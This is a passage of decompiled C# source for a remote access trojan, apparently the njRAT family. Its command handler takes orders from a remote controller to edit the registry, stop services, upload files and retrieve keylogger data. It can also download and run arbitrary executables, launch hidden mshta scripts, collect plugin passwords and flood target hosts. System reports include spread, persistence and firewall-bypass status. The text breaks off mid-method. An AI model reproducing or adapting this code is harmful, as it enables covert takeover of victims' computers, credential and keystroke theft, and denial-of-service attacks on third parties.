using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using n.My;
using n.My.Resources;

namespace n;

[StandardModule]
internal sealed class IND
{
	public delegate void indd(string T);

	public class UL
	{
		public int idx;

		public string F;

		public int sock;

		private TcpClient k;

		public int PZ;

		private byte[] bb;

		private int fz;

		private int sd;

		private bool rc;

		public UL()
		{
			k = new TcpClient();
			PZ = -1;
			rc = false;
		}

		public void R()
		{
			checked
			{
				try
				{
					fz = (int)FileSystem.FileLen(API.DEB(ref F));
					string data = "#26" + Y + Conversions.ToString(sock) + Y + F + Y + Conversions.ToString(fz) + Y + Conversions.ToString(idx) + "nj-q8";
					byte[] array = MyProject.Forms.B.WC.STB(data);
					k.Client.Send(array, array.Length, SocketFlags.None);
					do
					{
						Thread.Sleep(1);
					}
					while (k.Client.Available <= 0);
					byte[] array2 = new byte[k.Client.Available + 1];
					k.Client.Receive(array2, array2.Length, SocketFlags.None);
					PZ = Conversions.ToInteger(MyProject.Forms.B.WC.BTS(array2).Replace("nj-q8", ""));
					if (PZ != -1)
					{
						MemoryStream memoryStream = new MemoryStream();
						memoryStream.Write(bb, PZ, bb.Length - PZ);
						k.Client.Send(memoryStream.ToArray(), memoryStream.ToArray().Length, SocketFlags.None);
					}
					try
					{
						k.Close();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					bb = null;
					rc = true;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}

		public void start()
		{
			try
			{
				bb = File.ReadAllBytes(API.DEB(ref F));
				k.Client.ReceiveBufferSize = 999999;
				k.Client.SendBufferSize = 999999;
				k.Client.ReceiveTimeout = -1;
				k.Client.SendTimeout = -1;
				k.Client.Connect(B.no.Split(new char[1] { ':' })[0], Conversions.ToInteger(B.no.Split(new char[1] { ':' })[1]));
				Thread thread = new Thread(R);
				thread.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string TM = Interaction.Environ("temp") + "\\";

	public static string Y = "^:^";

	public static int LPING;

	public static chat Ca = new chat();

	public static bool bz = false;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	public static void inddd(string T)
	{
		RichTextBox t = B.Chat.T1;
		t.set_Text(t.get_Text() + B.Chat.nick + " : " + T + "\r\n");
	}

	public static RegistryKey Rk(ref string p, ref bool W)
	{
		Array array = Strings.Split(p, "\\", -1, (CompareMethod)0);
		object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null);
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CLASSES_ROOT", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_USER", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_LOCAL_MACHINE", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_USERS", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_Users().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_CONFIG", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentConfig().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		RegistryKey result = default(RegistryKey);
		return result;
	}

	public static void ind(byte[] Da)
	{
		//IL_08da: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c3e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c45: Expected O, but got Unknown
		//IL_1c5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c61: Expected O, but got Unknown
		//IL_28cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_28d3: Expected O, but got Unknown
		int Er = 0;
		string @string = Encoding.UTF8.GetString(Da);
		checked
		{
			int num4 = default(int);
			try
			{
				Array array = Strings.Split(@string, Y, -1, (CompareMethod)0);
				switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null).ToString())
				{
				case "#KON":
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"T", false))
					{
						B.KON = true;
					}
					else
					{
						B.KON = false;
					}
					break;
				case "#RG":
				{
					Er = 1;
					object obj2 = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
					if (Operators.ConditionalCompareObjectEqual(obj2, (object)"~", false))
					{
						object[] array6 = new object[1];
						object[] array43 = array6;
						int num3 = 2;
						array43[0] = 2;
						string T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						bool CM = false;
						RegistryKey registryKey = Rk(ref T, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T }, (string[])null, true, false);
						RegistryKey registryKey2 = registryKey;
						string[] subKeyNames = registryKey2.GetSubKeyNames();
						string text23 = default(string);
						foreach (string text22 in subKeyNames)
						{
							string text24 = text23;
							T = text22 + Y + Y + "Key";
							text23 = text24 + API.ENB(ref T) + Y;
						}
						string[] valueNames = registryKey2.GetValueNames();
						foreach (string text25 in valueNames)
						{
							string text26 = registryKey2.GetValue(text25, RuntimeHelpers.GetObjectValue(new object()))!.ToString();
							if (text26.Length > 200)
							{
								text26 = Strings.Mid(text26, 1, 200);
							}
							string text27 = text23;
							T = text25 + Y + text26 + Y + "Value";
							text23 = text27 + API.ENB(ref T) + Y;
						}
						B b13 = MyProject.Forms.B;
						T = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat("#RG" + Y, "~"), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), (object)Y), (object)text23));
						b13.SEND(ref T);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"!", false))
					{
						object[] array6 = new object[1];
						object[] array44 = array6;
						int num3 = 2;
						array44[0] = 2;
						string T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						bool CM = true;
						RegistryKey registryKey3 = Rk(ref T, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T }, (string[])null, true, false);
						RegistryKey registryKey4 = registryKey3;
						registryKey4.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)), RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 4 }, (string[])null)));
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"@", false))
					{
						object[] array6 = new object[1];
						object[] array45 = array6;
						int num3 = 2;
						array45[0] = 2;
						string T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						bool CM = true;
						RegistryKey registryKey5 = Rk(ref T, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T }, (string[])null, true, false);
						RegistryKey registryKey6 = registryKey5;
						int num23 = array.Length - 1;
						for (int num24 = 3; num24 <= num23; num24++)
						{
							Array array46 = Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num24 }, (string[])null)), "\\", -1, (CompareMethod)0);
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array46, new object[1] { 1 }, (string[])null), (object)"Key", false))
							{
								registryKey6.DeleteSubKeyTree(Conversions.ToString(NewLateBinding.LateIndexGet((object)array46, new object[1] { 0 }, (string[])null)));
							}
							else
							{
								registryKey6.DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array46, new object[1] { 0 }, (string[])null)));
							}
						}
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"#", false))
					{
						object[] array6 = new object[1];
						object[] array47 = array6;
						int num3 = 2;
						array47[0] = 2;
						string T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						bool CM = true;
						RegistryKey registryKey7 = Rk(ref T, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T }, (string[])null, true, false);
						RegistryKey registryKey8 = registryKey7;
						registryKey8.CreateSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
					}
					break;
				}
				case "#k":
				{
					Er = 1;
					string T = "lg";
					string s2 = "..";
					string s3 = NK.GetValue(ref T, ref s2);
					B b11 = MyProject.Forms.B;
					s2 = "#k" + Y + API.ENB(ref s3);
					b11.SEND(ref s2);
					break;
				}
				case "#X":
				{
					Er = 0;
					int num10 = 8 + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length;
					MemoryStream memoryStream6 = new MemoryStream();
					memoryStream6.Write(Da, num10, Da.Length - num10);
					byte[] b7 = memoryStream6.ToArray();
					bool CM = false;
					byte[] bytes = API.ZIP(b7, ref CM);
					int num11 = 0;
					do
					{
						if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num11), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
						{
							try
							{
								File.Delete(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num11), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
								File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num11), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
								NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num11), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
							}
							catch (Exception ex9)
							{
								ProjectData.SetProjectError(ex9, num4);
								ProjectData.ClearProjectError();
								goto IL_06c3;
							}
						}
						else
						{
							File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num11), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
							NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num11), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						break;
						IL_06c3:
						num11++;
					}
					while (num11 <= 999);
					break;
				}
				case "##":
				{
					Er = 5;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().SetValue(B.plg, RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					B b17 = MyProject.Forms.B;
					string s2 = "plugin";
					b17.SEND(ref s2);
					break;
				}
				case "#Rec":
					break;
				case "#ser0":
				{
					Er = 1;
					ServiceController[] services2 = ServiceController.GetServices();
					string text28 = default(string);
					string s2;
					foreach (ServiceController val5 in services2)
					{
						string text29 = text28;
						string y6 = Y;
						s2 = val5.get_ServiceName() + "{}" + Strings.Replace(Strings.Replace(Conversions.ToString(val5.get_CanStop()), Conversions.ToString(true), "Yes", 1, -1, (CompareMethod)0), Conversions.ToString(false), "No", 1, -1, (CompareMethod)0) + "{}" + ((Enum)val5.get_Status()).ToString() + "{}" + val5.get_DisplayName();
						text28 = text29 + y6 + API.ENB(ref s2);
					}
					B b14 = MyProject.Forms.B;
					s2 = "#ser0" + text28;
					b14.SEND(ref s2);
					break;
				}
				case "#ser1":
				{
					Er = 1;
					ServiceController[] services = ServiceController.GetServices();
					foreach (ServiceController val2 in services)
					{
						if (Operators.ConditionalCompareObjectEqual((object)val2.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
						{
							val2.Start();
						}
					}
					break;
				}
				case "#ser2":
				{
					Er = 1;
					ServiceController[] services3 = ServiceController.GetServices();
					foreach (ServiceController val7 in services3)
					{
						if (Operators.ConditionalCompareObjectEqual((object)val7.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
						{
							val7.Stop();
						}
					}
					break;
				}
				case "#R":
				{
					Er = 0;
					string s2 = "vname";
					object[] array6 = new object[1];
					object[] array73 = array6;
					int num3 = 1;
					array73[0] = 1;
					string T = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					NK.SetValue(ref s2, ref T);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T }, (string[])null, true, false);
					B.Vname = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					B b26 = MyProject.Forms.B;
					s2 = "#R" + Y + B.Vname;
					b26.SEND(ref s2);
					break;
				}
				case "p":
				{
					B b25 = MyProject.Forms.B;
					string s2 = "p";
					b25.SEND(ref s2);
					break;
				}
				case "#0":
				{
					Er = 0;
					B b20 = MyProject.Forms.B;
					string s2 = "#red";
					b20.SEND(ref s2);
					FLD fLD2 = new FLD();
					object[] array6 = new object[1];
					object[] array66 = array6;
					int num3 = 1;
					array66[0] = 1;
					s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string text45 = API.DEB(ref s2);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s2 }, (string[])null, true, false);
					fLD2.HOST = Strings.Split(text45, Y, -1, (CompareMethod)0)[0];
					array6 = new object[1];
					object[] array67 = array6;
					num3 = 1;
					array67[0] = 1;
					s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string text46 = API.DEB(ref s2);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s2 }, (string[])null, true, false);
					fLD2.Port = Conversions.ToInteger(Strings.Split(text46, Y, -1, (CompareMethod)0)[1]);
					fLD2.pk = new byte[1001];
					array6 = new object[1];
					object[] array68 = array6;
					num3 = 1;
					array68[0] = 1;
					s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string text47 = API.DEB(ref s2);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s2 }, (string[])null, true, false);
					fLD2.Count = Conversions.ToInteger(Strings.Split(text47, Y, -1, (CompareMethod)0)[2]);
					bool CM = false;
					fLD2.Start(ref CM);
					B b21 = MyProject.Forms.B;
					s2 = "#Bla";
					b21.SEND(ref s2);
					break;
				}
				case "#1":
				{
					Er = 0;
					B b18 = MyProject.Forms.B;
					string s2 = "#red";
					b18.SEND(ref s2);
					FLD fLD = new FLD();
					object[] array6 = new object[1];
					object[] array63 = array6;
					int num3 = 1;
					array63[0] = 1;
					s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string text42 = API.DEB(ref s2);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s2 }, (string[])null, true, false);
					fLD.HOST = Strings.Split(text42, Y, -1, (CompareMethod)0)[0];
					array6 = new object[1];
					object[] array64 = array6;
					num3 = 1;
					array64[0] = 1;
					s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string text43 = API.DEB(ref s2);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s2 }, (string[])null, true, false);
					fLD.Port = Conversions.ToInteger(Strings.Split(text43, Y, -1, (CompareMethod)0)[1]);
					fLD.pk = new byte[1001];
					array6 = new object[1];
					object[] array65 = array6;
					num3 = 1;
					array65[0] = 1;
					s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string text44 = API.DEB(ref s2);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s2 }, (string[])null, true, false);
					fLD.Count = Conversions.ToInteger(Strings.Split(text44, Y, -1, (CompareMethod)0)[2]);
					bool CM = true;
					fLD.Start(ref CM);
					B b19 = MyProject.Forms.B;
					s2 = "#Bla";
					b19.SEND(ref s2);
					break;
				}
				case "#2":
				{
					Er = 0;
					string text30 = "." + Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0)[Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0).Length - 1];
					int num27 = 0;
					int num28 = default(int);
					do
					{
						IL_0f09:
						if (File.Exists(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num27) + text30))
						{
							try
							{
								File.Delete(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num27) + text30);
								num28++;
								if (num28 > 5)
								{
									break;
								}
							}
							catch (Exception ex15)
							{
								ProjectData.SetProjectError(ex15, num4);
								ProjectData.ClearProjectError();
								goto IL_0ef7;
							}
							goto IL_0f09;
						}
						string text31 = Interaction.Environ("appdata") + "\\" + Conversions.ToString(num27) + text30;
						Network network = ((ServerComputer)MyProject.Computer).get_Network();
						object[] array52 = new object[2];
						object[] array53 = array52;
						object[] array6 = new object[1];
						object[] array54 = array6;
						int num3 = 1;
						array54[0] = 1;
						array53[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						array52[1] = text31;
						object[] array55 = array52;
						object[] array56 = array55;
						bool[] array57 = new bool[2] { true, true };
						NewLateBinding.LateCall((object)network, (Type)null, "DownloadFile", array56, (string[])null, (Type[])null, array57, true);
						if (array57[0])
						{
							NewLateBinding.LateIndexSetComplex((object)array, new object[2]
							{
								num3,
								RuntimeHelpers.GetObjectValue(array55[0])
							}, (string[])null, true, false);
						}
						if (array57[1])
						{
							text31 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array55[1]), typeof(string));
						}
						Process.Start(text31);
						break;
						IL_0ef7:
						num27++;
					}
					while (num27 <= 9999);
					break;
				}
				case "#3":
				{
					Er = 0;
					MemoryStream memoryStream10 = new MemoryStream();
					byte[] bytes2 = Encoding.Default.GetBytes("#4" + Y);
					memoryStream10.Write(bytes2, 0, bytes2.Length);
					Encoding @default = Encoding.Default;
					string s2 = "plugin.C";
					string T = "Pass";
					object P = null;
					string Text = Conversions.ToString(C.inv(ref C.Plug, ref s2, ref T, ref P));
					byte[] bytes3 = @default.GetBytes(API.ENB(ref Text));
					bool CM = true;
					bytes2 = API.ZIP(bytes3, ref CM);
					memoryStream10.Write(bytes2, 0, bytes2.Length);
					MyProject.Forms.B.WC.SendData(memoryStream10.ToArray());
					break;
				}
				case "#4":
					Er = 0;
					try
					{
						MyProject.Forms.B.BW.B.Dispose();
						A.fj.Dispose();
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3, num4);
						ProjectData.ClearProjectError();
					}
					if (B.UU)
					{
						try
						{
							Process[] processesByName = Process.GetProcessesByName("wscript");
							foreach (Process process in processesByName)
							{
								try
								{
									process.Kill();
								}
								catch (Exception ex4)
								{
									ProjectData.SetProjectError(ex4, num4);
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception ex5)
						{
							ProjectData.SetProjectError(ex5, num4);
							ProjectData.ClearProjectError();
						}
					}
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"!", false))
					{
						NK.CLEAR();
						try
						{
							DriveInfo[] drives = DriveInfo.GetDrives();
							foreach (DriveInfo driveInfo in drives)
							{
								if (!driveInfo.IsReady || driveInfo.TotalFreeSpace <= 0L)
								{
									continue;
								}
								try
								{
									if (File.Exists(driveInfo.Name + B.Uo))
									{
										File.Delete(driveInfo.Name + B.Uo);
									}
								}
								catch (Exception ex6)
								{
									ProjectData.SetProjectError(ex6, num4);
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7, num4);
							ProjectData.ClearProjectError();
						}
						try
						{
							string path4 = Application.get_StartupPath() + "\\j.vbs";
							string Text = Resources.W;
							File.WriteAllText(path4, API.DEB(ref Text).Replace("NJ", Application.get_ExecutablePath()));
							Process.Start(Application.get_StartupPath() + "\\j.vbs");
						}
						catch (Exception ex8)
						{
							ProjectData.SetProjectError(ex8, num4);
							ProjectData.ClearProjectError();
						}
					}
					ProjectData.EndApp();
					break;
				case "#5":
				{
					Er = 0;
					ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
					processStartInfo2.FileName = "mshta.exe";
					processStartInfo2.Arguments = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					processStartInfo2.CreateNoWindow = true;
					processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
					Process process3 = Process.Start(processStartInfo2);
					Thread.Sleep(60000);
					try
					{
						process3.Kill();
					}
					catch (Exception ex22)
					{
						ProjectData.SetProjectError(ex22, num4);
						ProjectData.ClearProjectError();
					}
					break;
				}
				case "#6":
					Er = 0;
					try
					{
						MyProject.Forms.B.BW.B.Dispose();
						if (A.fj.Id > 1)
						{
							A.fj.Kill();
						}
					}
					catch (Exception ex21)
					{
						ProjectData.SetProjectError(ex21, num4);
						ProjectData.ClearProjectError();
					}
					Process.Start(Application.get_ExecutablePath());
					ProjectData.EndApp();
					break;
				case "#7":
				{
					Er = 2;
					object[] array4 = new object[1];
					object[] array70 = array4;
					int num3 = 1;
					array70[0] = 1;
					int CLR = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					byte[] array71 = sc.gc(ref CLR);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, CLR }, (string[])null, true, false);
					byte[] array72 = array71;
					if (array72.Length == 0)
					{
						B b23 = MyProject.Forms.B;
						string Text = "#5" + Y + Conversions.ToString(0);
						b23.SEND(ref Text);
					}
					else
					{
						MemoryStream memoryStream11 = new MemoryStream();
						memoryStream11.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
						memoryStream11.Write(array72, 0, array72.Length);
						MyProject.Forms.B.WC.SendData(memoryStream11.ToArray());
					}
					break;
				}
				case "#8":
				{
					string text48 = "\r\n";
					string text49 = text49 + "pC InfoX*X==" + text48;
					text49 = text49 + "PC\\UserX*X" + B.PC + text48;
					text49 = text49 + "CountryX*X" + API.Gc() + text48;
					text49 = text49 + "OSX*X" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("Windows", "")
						.Replace("  ", " ")
						.Replace("Microsoft", "")
						.Replace("®", "")
						.Replace("™", "") + text48;
					text49 = Conversions.ToString(Operators.AddObject((object)text49, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"ProcessorX*X", ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")!.GetValue("~mhz")), (object)" *"), (object)Environment.ProcessorCount), (object)"~MHZ"), (object)text48)));
					text49 = text49 + "RAMX*X" + Strings.Format((object)((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1073741824.0), "#0.00 GB") + text48;
					text49 = text49 + "UpTimeX*X" + Strings.Split(Strings.Mid(Conversions.ToString((double)Environment.TickCount / 3600000.0), 1, 5), ".", -1, (CompareMethod)0)[0] + " :Hours" + text48;
					text49 = text49 + "Server InfoX*X==" + text48;
					text49 = text49 + "ServerX*X" + API.DEB(ref B.Vname) + "_" + sc.HWD() + text48;
					text49 = text49 + "Host:PortX*X" + B.no + text48;
					text49 = text49 + "DirectoryX*X" + Application.get_StartupPath() + text48;
					text49 = text49 + "ExeNameX*X" + AppDomain.CurrentDomain.FriendlyName + text48;
					text49 = text49 + "Process IDX*X" + Conversions.ToString(Process.GetCurrentProcess().Id) + text48;
					text49 = text49 + "StartupX*X" + B.SU + text48;
					text49 = text49 + "PersistantX*X" + Conversions.ToString(B.UU) + text48;
					text49 = text49 + "SpreadX*X" + B.spread + text48;
					text49 = text49 + "MutexX*X" + B.mU + text48;
					text49 = text49 + "First RunX*X" + B.FR + text48;
					text49 = text49 + "RegKeyX*X" + NK.Key + text48;
					text49 = text49 + "Firewall BypassX*X" + Strings.Replace(B.Fw.ToString(), "True", "Yes", 1, -1, (CompareMethod)0).Replace("False", "No");
					B b22 = MyProject.Forms.B;
					string Text = "#7" + Y + API.ENB(ref text49);
					b22.SEND(ref Text);
					break;
				}
				case "#9":
				{
					Er = 6;
					string text32 = default(string);
					string Text;
					try
					{
						DriveInfo[] drives2 = DriveInfo.GetDrives();
						foreach (DriveInfo driveInfo2 in drives2)
						{
							try
							{
								if (driveInfo2.IsReady)
								{
									string text33 = text32;
									string y7 = Y;
									Text = driveInfo2.Name + Y + driveInfo2.DriveType;
									text32 = text33 + y7 + API.ENB(ref Text);
								}
							}
							catch (Exception ex16)
							{
								ProjectData.SetProjectError(ex16, num4);
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception ex17)
					{
						ProjectData.SetProjectError(ex17, num4);
						ProjectData.ClearProjectError();
					}
					string[] array58 = "UserProfile.Public.ProgramFiles.ProgramData.AppData.LocalAppData.WinDir.Temp".Split(new char[1] { '.' });
					string text34 = text32;
					string y8 = Y;
					Text = "Desktop" + Y + "DIR" + Y + ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
					text32 = text34 + y8 + API.ENB(ref Text);
					string[] array59 = array58;
					foreach (string text35 in array59)
					{
						try
						{
							string text36 = Interaction.Environ(text35);
							if (text36.Length > 0)
							{
								string text37 = text32;
								string y9 = Y;
								Text = text35 + Y + "DIR" + Y + text36;
								text32 = text37 + y9 + API.ENB(ref Text);
							}
						}
						catch (Exception ex18)
						{
							ProjectData.SetProjectError(ex18, num4);
							ProjectData.ClearProjectError();
						}
					}
					string text38 = text32;
					string y10 = Y;
					Text = "System32" + Y + "DIR" + Y + Interaction.Environ("windir") + "\\system32";
					text32 = text38 + y10 + API.ENB(ref Text);
					B b16 = MyProject.Forms.B;
					Text = "#8" + text32;
					b16.SEND(ref Text);
					break;
				}
				case "#10":
				{
					Er = 6;
					object[] array4 = new object[1];
					object[] array33 = array4;
					int CLR = 1;
					array33[0] = 1;
					string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string path9 = API.DEB(ref Text);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
					string[] directories = Directory.GetDirectories(path9);
					string text11 = default(string);
					foreach (string text10 in directories)
					{
						string text12 = text11;
						string y2 = Y;
						object[] array6 = new object[1];
						object[] array34 = array6;
						int num3 = 1;
						array34[0] = 1;
						string s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						string text13 = API.DEB(ref s2);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s2 }, (string[])null, true, false);
						string T = Strings.Replace(text10, text13, "", 1, -1, (CompareMethod)0) + "*DIR";
						text11 = text12 + y2 + API.ENB(ref T);
					}
					string[] array35 = new string[5] { "png", "jpg", "jpeg", "bmp", "ico" };
					int num18 = 0;
					array4 = new object[1];
					object[] array36 = array4;
					CLR = 1;
					array36[0] = 1;
					Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string path10 = API.DEB(ref Text);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
					string[] files = Directory.GetFiles(path10);
					bool flag2 = default(bool);
					foreach (string text14 in files)
					{
						string[] array37 = array35;
						foreach (string text15 in array37)
						{
							if (Operators.CompareString(text15.ToLower(), Strings.Split(text14, ".", -1, (CompareMethod)0)[Strings.Split(text14, ".", -1, (CompareMethod)0).Length - 1].ToLower(), false) == 0)
							{
								flag2 = true;
								break;
							}
						}
						if (unchecked(flag2 && num18 < 20))
						{
							try
							{
